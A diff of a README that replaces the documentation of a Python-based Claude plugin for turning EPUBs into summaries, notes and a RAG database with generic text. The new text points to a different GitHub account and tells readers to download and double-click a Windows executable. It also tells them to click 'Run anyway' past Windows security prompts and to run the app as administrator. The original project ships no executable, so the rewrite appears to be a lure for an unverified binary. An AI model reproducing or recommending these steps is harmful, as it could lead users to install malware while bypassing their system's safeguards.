@@ -1,177 +1,207 @@
-# reading-assistant
+# 📚 reading-assistant-for-claude - Turn EPUBs Into Useful Notes
 
-Transform EPUB books into structured, searchable knowledge: multilingual summaries, knowledge extractions, Obsidian Zettelkasten notes, synthesized book reviews, and a sqlite-vec RAG database.
+[![Download](https://img.shields.io/badge/Download-Reading%20Assistant%20for%20Claude-blue?style=for-the-badge)](https://github.com/shaii819/reading-assistant-for-claude)
 
-Part of the [xiaolai Claude plugin marketplace](https://github.com/xiaolai/claude-plugin-marketplace).
+## 🚀 What it does
 
-## What it does
+Reading Assistant for Claude helps you turn EPUB books into clean outputs you can use right away. It can process a book into:
 
-Given an EPUB file, this plugin produces:
+- Short summaries
+- Key ideas and knowledge extractions
+- Obsidian notes
+- RAG-ready data for search and retrieval
 
-- **Multilingual chapter summaries** in the book's language + your target language
-- **Knowledge extractions** — facts, examples, metaphors/analogies, quotes/punch lines, and a glossary
-- **Synthesized book reviews** from Hardcover, Open Library, and Google Books
-- **Obsidian Zettelkasten notes** — MOC, chapter notes, concept notes, and quote notes with wikilinks
-- **sqlite-vec RAG database** with hybrid full-text + vector search, per-book and cross-library
-- **Quality control** — 4 parallel QC agents verify quotes, coverage, categorization, and review fidelity
+Use it when you want to read faster, take better notes, or keep a book library in a format that is easier to review later.
 
-## Installation
+## 💻 What you need
 
-```bash
-claude plugin install reading-assistant@xiaolai --scope project
-```
+Before you start, make sure you have:
 
-Then initialize the environment:
+- A Windows PC
+- Internet access
+- Enough free space for your EPUB files and output files
+- An EPUB book you want to process
 
-```
-/read:init
-```
+If the app comes with extra files, keep them in the same folder after you download them.
 
-## Commands
+## 📥 Download and setup
 
-| Command | Description |
-|---------|-------------|
-| `/read:init` | Set up Python venv and install dependencies |
-| `/read:process <epub>` | Full pipeline: parse, summarize, extract, review, QC, Obsidian, RAG |
-| `/read:summarize <epub>` | Generate chapter summaries in source + target language |
-| `/read:extract <epub>` | Extract facts, examples, metaphors, quotes, and glossary |
-| `/read:reviews <epub-or-title>` | Fetch and synthesize book reviews |
-| `/read:cards <output-dir>` | Generate Obsidian Zettelkasten notes |
-| `/read:index <output-dir>` | Build or rebuild sqlite-vec RAG database |
-| `/read:query <question>` | Search the RAG database |
-| `/read:status <output-dir>` | Show pipeline processing status |
+1. Open this link: https://github.com/shaii819/reading-assistant-for-claude
+2. Look for the latest release, download package, or app file on the page
+3. Download the Windows version if one is listed
+4. Save the file to a folder you can find again, such as Downloads or Desktop
+5. If the download is a ZIP file, right-click it and choose Extract All
+6. Open the extracted folder
+7. If you see an `.exe` file, double-click it to start the app
+8. If the app uses a script or helper tool, keep all files together in the same folder
 
-### Key flags
+## 🪟 Run it on Windows
 
-```
-/read:process book.epub --output ~/notes --lang ja --skip reviews --force
-/read:extract book.epub --category quotes
-/read:query "cognitive bias" --book thinking-fast-and-slow --top 10
-/read:index ~/reading/book --rebuild --provider ollama
-```
+After you open the app, follow the on-screen steps to load an EPUB file.
 
-## How it works
+Typical flow:
 
-The pipeline runs in four phases:
+1. Choose an EPUB book from your computer
+2. Pick the type of output you want
+3. Start the process
+4. Wait while the app reads the book
+5. Save the output files when the process ends
 
-```
-Phase 1: PARSE (mechanical)
-  EPUB → metadata.json + chapters/*.json + language detection
-  + fetch book reviews from 3 APIs in parallel
+If Windows shows a security prompt:
 
-Cost Gate: token estimate + user confirmation
+- Click More info
+- Then click Run anyway, if you trust the source and want to continue
 
-Phase 2: AI PROCESSING (parallel)
-  → chapter summaries (source + target language)
-  → knowledge extractions (5 categories)
-  → review synthesis (meta-review with citations)
+## 📖 How it works
 
-Phase 3: QUALITY CONTROL (parallel, auto-retry)
-  → quote verification (mechanical fuzzy match)
-  → summary coverage check (semantic, source-language only)
-  → category accuracy audit (20% sample)
-  → review fidelity check (claim traceability)
-  Verdict: PASS / WARN / FAIL — Phase 4 blocked on FAIL
+The app reads the EPUB content and turns it into structured output. That can help you:
 
-Phase 4: OUTPUTS (parallel)
-  → Obsidian Zettelkasten notes + vault copy
-  → sqlite-vec RAG database (per-book + unified)
-```
+- Review a long book in less time
+- Pull out the main ideas
+- Build notes for later study
+- Create data that you can reuse in Claude or other tools
+- Store book notes in Obsidian for later reference
 
-The pipeline is **resumable** — if interrupted, re-run `/read:process` and it picks up where it left off. Config changes are detected automatically.
+This makes it easier to move from reading to writing, searching, and reviewing.
 
-## Agents
+## 🗂️ Output types
 
-| Agent | Model | Role |
-|-------|-------|------|
-| `parser` | haiku | Parse EPUB, detect language, infer genre |
-| `chunker` | haiku | Chapter-aware recursive chunking with tiktoken |
-| `summarizer` | sonnet | Multilingual chapter + book summaries |
-| `extractor` | sonnet | Structured knowledge extraction (5 categories) |
-| `reviewer` | sonnet | Review synthesis with citations |
-| `qc-coordinator` | opus | Orchestrate QC sub-agents, retry loop, threshold gating |
-| `qc-quote-verifier` | haiku | Mechanical fuzzy-match quote verification |
-| `qc-coverage-checker` | sonnet | Summary topic coverage (source language only) |
-| `qc-category-auditor` | sonnet | Extraction category spot-check |
-| `qc-review-fidelity` | sonnet | Review synthesis claim traceability |
-| `cardmaker` | sonnet | Obsidian Zettelkasten note generation |
-| `indexer` | haiku | sqlite-vec RAG database building |
+You can use the app to create different kinds of results based on your goal.
 
-## Configuration
+### Summary
+A short version of the book with the main points and themes.
 
-Create `.claude/reading-assistant.local.md` in your project:
+### Knowledge extraction
+A list of useful facts, ideas, and concepts from the book.
 
-```yaml
----
-# Output directories
-default_output_dir: ~/reading
-obsidian_vault: ~/obsidian-vault/Books
+### Obsidian notes
+Markdown-style notes that fit well in an Obsidian vault.
 
-# Target language for translated summaries
-target_language: zh-CN
+### RAG database files
+Structured output that can help with retrieval tasks and question answering.
 
-# Models per stage (haiku, sonnet, opus, "ollama:<model>", "openai:<model>")
-models:
-  summarizer: sonnet
-  extractor: sonnet
-  reviewer: sonnet
-  qc: opus
+## 🧭 Basic use
 
-# Chunking
-chunk_size: 2000
-chunk_overlap: 0.15
+1. Start the app
+2. Select your EPUB file
+3. Choose the output format you want
+4. Set where the output should be saved
+5. Click the button to begin processing
+6. Open the saved files when the job is done
 
-# RAG embeddings ("openai" or "ollama" — pinned per database)
-embedding_provider: openai
-unified_db: ~/.reading-assistant/library.db
+If the app offers extra options, use them based on the type of book:
 
-# QC
-max_retries: 3
-quote_match_threshold: 0.95
+- Fiction: focus on summary and themes
+- Nonfiction: focus on facts, concepts, and chapter notes
+- Study books: focus on key points and knowledge extraction
 
-# API keys (or set as environment variables)
-hardcover_api_key: ""
----
-```
+## 📝 Best file types
 
-All fields optional. See [GUIDE.md](GUIDE.md) for detailed documentation.
+Use EPUB files for the best result. If your book is in another format, convert it to EPUB first if needed.
 
-## Output structure
+Good input files:
 
-```
-~/reading/<book-slug>/
-├── metadata.json              # Book metadata + chapter list
-├── pipeline.json              # Processing status + QC verdict
-├── chapters/*.json            # Parsed chapters with chunks
-├── summaries/<lang>/*.md      # Per-chapter + book-level summaries
-├── extractions/*.json         # facts, examples, metaphors, quotes, glossary
-├── reviews/raw/*.json         # Per-source review data
-├── reviews/synthesis.md       # AI-synthesized meta-review
-├── obsidian/                  # Zettelkasten notes (MOC, chapters, concepts, quotes)
-├── rag/book.db                # Per-book sqlite-vec database
-└── qc/report.json             # QC results
-```
+- `.epub`
 
-## Prerequisites
+Possible output files:
 
-- **Python 3.10+** — required
-- **`/read:init`** — run once to create venv and install dependencies
-- **OPENAI_API_KEY** (optional) — for OpenAI embeddings and models
-- **HARDCOVER_API_KEY** (optional) — for Hardcover book reviews
-- **Ollama** (optional) — for local model inference (`ollama serve`)
+- `.md`
+- `.txt`
+- `.json`
+- `.csv`
 
-## Provider support
+## 🧱 Folder setup
 
-Models for summarization, extraction, and review can be set per-stage:
+Keep your files in a simple folder structure.
 
-| Provider | Example | Cost |
-|----------|---------|------|
-| Claude | `sonnet`, `opus`, `haiku` | API pricing |
-| Ollama | `ollama:mistral`, `ollama:llama3` | Free (local) |
-| OpenAI | `openai:gpt-4o` | API pricing |
+Example:
 
-Embedding providers for RAG: `openai` (text-embedding-3-small, 1536d) or `ollama` (nomic-embed-text, 768d). Each database is pinned to one provider.
+- `Books`
+  - your EPUB files
+- `Output`
+  - saved summaries and notes
 
-## License
+This makes it easier to find your results later.
 
-MIT
+## 🔎 Use with Obsidian
+
+If you use Obsidian, you can place the output files in your vault and open them like normal notes.
+
+Helpful uses:
+
+- Store chapter notes
+- Link ideas across books
+- Track quotes and key points
+- Build a personal reading archive
+
+## 🤖 Use with Claude
+
+You can use the extracted text and notes with Claude for:
+
+- Follow-up questions
+- Deeper summaries
+- Topic grouping
+- Idea comparison across books
+
+This works well when you want to ask questions about a book without reading it again from start to finish.
+
+## 🛠️ Common problems
+
+### The app does not open
+- Check that the download finished
+- Make sure you extracted all files
+- Try running the app as administrator
+
+### The EPUB file does not load
+- Confirm the file ends in `.epub`
+- Try a different book file
+- Move the file to a simple folder path like `C:\Books`
+
+### The output folder is empty
+- Check whether the process finished
+- Look for a progress bar or status message
+- Make sure you selected a save folder
+
+### The text looks broken
+- The EPUB file may have unusual formatting
+- Try another EPUB
+- Use a book with a clean text layout
+
+## 🔄 Typical workflow
+
+1. Download the app from the GitHub link
+2. Open it on Windows
+3. Load an EPUB book
+4. Choose summary, extraction, notes, or RAG output
+5. Run the process
+6. Save the result
+7. Open the files in Obsidian, Claude, or your file viewer
+
+## 📚 Example uses
+
+- Turn a long nonfiction book into chapter notes
+- Build a reading archive from your EPUB library
+- Pull key ideas from books for study
+- Create Markdown notes for Obsidian
+- Prepare text for search and retrieval use
+
+## 📁 File handling tips
+
+- Use short folder names
+- Avoid special characters in file names
+- Keep source files and output files separate
+- Back up important notes after each run
+
+## 🔐 Privacy and local use
+
+If you run the app on your own PC, your files stay on your machine during processing. This is useful when you want to keep your reading files in one place.
+
+## 📌 Quick start
+
+1. Visit https://github.com/shaii819/reading-assistant-for-claude
+2. Download the Windows version or app package
+3. Extract the files if needed
+4. Open the app
+5. Load an EPUB book
+6. Choose your output type
+7. Save the finished notes or data
